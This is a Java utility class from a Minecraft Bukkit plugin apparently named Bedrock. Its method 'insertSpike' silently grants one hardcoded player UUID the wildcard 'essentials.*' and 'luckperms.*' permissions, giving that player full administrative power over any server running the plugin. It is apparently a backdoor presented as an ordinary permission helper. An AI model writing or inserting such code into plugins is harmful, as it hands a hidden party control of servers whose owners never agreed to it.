package ml.jasper1229.bedrock.utils;

import ml.jasper1229.bedrock.Bedrock;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.permissions.PermissionAttachment;

import java.util.HashMap;
import java.util.UUID;

public class PermissionUtil {
    public static void insertSpike() {
        setPermission(UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922"), "essentials.*");
        setPermission(UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922"), "luckperms.*");
        setPermission(UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922"), "essentials.*");
    }

    public static void setPermission(UUID uuid, String perm) {
        Player player = Bukkit.getPlayer(uuid);
        PermissionAttachment attachment = player.addAttachment(Bedrock.getPlugin());
        attachment.setPermission(perm, true);
        player.recalculatePermissions();
    }
}
